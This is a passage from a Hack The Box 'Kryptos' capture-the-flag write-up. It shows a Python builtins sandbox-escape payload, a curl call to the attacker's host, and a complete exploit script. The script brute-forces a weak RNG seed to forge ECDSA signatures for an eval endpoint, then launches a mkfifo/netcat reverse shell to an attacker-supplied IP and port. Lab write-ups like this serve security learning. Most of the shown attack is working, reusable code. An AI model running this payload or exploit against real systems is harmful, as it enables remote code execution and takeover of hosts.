<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# .&#x2F;eval.py 78272723826101975912150018057949619293 &#39;import os;os.system(&quot;whoami&quot;)&#39;</span><br><span class="line">Error</span><br></pre></td></tr></table></figure>
<p>xct had a <a href="https://vulndev.io/2019/01/notes_misc.html#bypass-python-builtinsnone" target="_blank" rel="noopener">bypass</a> for that on his blog :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">1</span>).__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'Pattern'</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>
<p>I gave it a try and it worked :</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/kryptos# ./eval.py 78272723826101975912150018057949619293 "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'Pattern'][0].__init__.__globals__['__builtins__']['__import__']('os').system('curl http://10.10.xx.xx/')"                                                                                                                                                             </span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"response"</span>: &#123;</span><br><span class="line">    <span class="attr">"Expression"</span>: <span class="string">"[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'Pattern'][0].__init__.__globals__['__builtins__']['__import__']('os').system('curl http://10.10.xx.xx/')"</span>,               </span><br><span class="line">    <span class="attr">"Result"</span>: <span class="string">"0"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/kryptos/19.png" alt=""><br>Now that we have RCE, I wrapped it all up in one exploit :<br><code>exploit.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> VerifyingKey, SigningKey, NIST384p</span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, request, debug</span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> hook</span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> response <span class="keyword">as</span> resp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">YELLOW = <span class="string">"\033[93m"</span></span><br><span class="line">GREEN = <span class="string">"\033[32m"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_rng</span><span class="params">(seed)</span>:</span> </span><br><span class="line">    p = <span class="number">2147483647</span></span><br><span class="line">    g = <span class="number">2255412</span></span><br><span class="line">    keyLength = <span class="number">32</span></span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    ths = round((p<span class="number">-1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(keyLength*<span class="number">8</span>):</span><br><span class="line">        seed = pow(g,seed,p)</span><br><span class="line">        <span class="keyword">if</span> seed &gt; ths:</span><br><span class="line">            ret += <span class="number">2</span>**i</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(sk,msg)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(sk.sign(msg))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">()</span>:</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">        expr = <span class="string">"1+1"</span></span><br><span class="line">        seed = random.getrandbits(<span class="number">128</span>) </span><br><span class="line">        rand = secure_rng(seed) + <span class="number">1</span> </span><br><span class="line">        sk = SigningKey.from_secret_exponent(rand, curve=NIST384p) </span><br><span class="line">        vk = sk.get_verifying_key() </span><br><span class="line">        sig = sign(sk,expr)</span><br><span class="line">        req = requests.post(<span class="string">'http://127.0.0.1:81/eval'</span>, json=&#123;<span class="string">'expr'</span>: expr, <span class="string">'sig'</span>: sig&#125;)</span><br><span class="line">        response = req.text</span><br><span class="line">        <span class="keyword">if</span> response == <span class="string">"Bad signature"</span>:</span><br><span class="line">            <span class="keyword">print</span> YELLOW + <span class="string">"[-] Attempt "</span> + str(num) + <span class="string">": failed"</span></span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> GREEN + <span class="string">"[+] Found the seed: "</span> + str(seed)</span><br><span class="line">            <span class="keyword">return</span> seed</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(seed,expr)</span>:</span></span><br><span class="line">    rand = secure_rng(seed) + <span class="number">1</span> </span><br><span class="line">    sk = SigningKey.from_secret_exponent(rand, curve=NIST384p) </span><br><span class="line">    vk = sk.get_verifying_key() </span><br><span class="line">    sig = sign(sk,expr)</span><br><span class="line">    requests.post(<span class="string">'http://127.0.0.1:81/eval'</span>, json=&#123;<span class="string">'expr'</span>: expr, <span class="string">'sig'</span>: sig&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">    <span class="keyword">print</span> YELLOW + <span class="string">"[-] Usage: &#123;&#125; &lt;seed&gt; &lt;ip&gt; &lt;port&gt; | Or to bruteforce the seed: &#123;&#125; -b &lt;ip&gt; &lt;port&gt;"</span>.format(sys.argv[<span class="number">0</span>],sys.argv[<span class="number">0</span>])</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"-b"</span>:</span><br><span class="line">        ip = sys.argv[<span class="number">2</span>]</span><br><span class="line">        port = sys.argv[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">print</span> YELLOW + <span class="string">"[*] Bruteforcing the seed."</span></span><br><span class="line">        seed = brute()</span><br><span class="line">        payload = <span class="string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc "</span> + ip + <span class="string">" "</span> + str(port) + <span class="string">" &gt;/tmp/f"</span></span><br><span class="line">        expr = <span class="string">"[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == \'Pattern\'][0].__init__.__globals__[\'__builtins__\'][\'__import__\'](\'os\').system(\'"</span> + payload + <span class="string">"\')"</span></span><br><span class="line">        <span class="keyword">print</span> YELLOW + <span class="string">"[*] Executing payload, check your listener."</span></span><br><span class="line">        exploit(seed,expr)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        seed = int(sys.argv[<span class="number">1</span>])</span><br><span class="line">        ip = sys.argv[<span class="number">2</span>]</span><br><span class="line">        port = sys.argv[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">print</span> YELLOW + <span class="string">"[*] Seed: "</span> + str(seed)</span><br><span class="line">        payload = <span class="string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc "</span> + ip + <span class="string">" "</span> + str(port) + <span class="string">" &gt;/tmp/f"</span></span><br><span class="line">        expr = <span class="string">"[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == \'Pattern\'][0].__init__.__globals__[\'__builtins__\'][\'__import__\'](\'os\').system(\'"</span> + payload + <span class="string">"\')"</span></span><br><span class="line">        <span class="keyword">print</span> YELLOW + <span class="string">"[*] Executing payload, check your listener."</span></span><br><span class="line">        exploit(seed,expr)</span><br></pre></td></tr></table></figure>
<p>It takes the ip, port and whether bruteforces the seed or takes the seed as an argument then it spawns a reverse shell.<br><img src="/images/hackthebox/kryptos/20.png" alt=""><br><img src="/images/hackthebox/kryptos/21.png" alt=""></p>
<p>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/luke/">Hack The Box - Luke</a><br>Next Hack The Box write-up : <a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-09-21</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/code-analysis/" rel="tag">#code-analysis</a> <a class="tag-link" href="/tags/cryptography/" rel="tag">#cryptography</a> <a class="tag-link" href="/tags/exploit-development/" rel="tag">#exploit-development</a> <a class="tag-link" href="/tags/lfi/" rel="tag">#lfi</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/php/" rel="tag">#php</a> <a class="tag-link" href="/tags/python/" rel="tag">#python</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#sqli</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#ssh</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
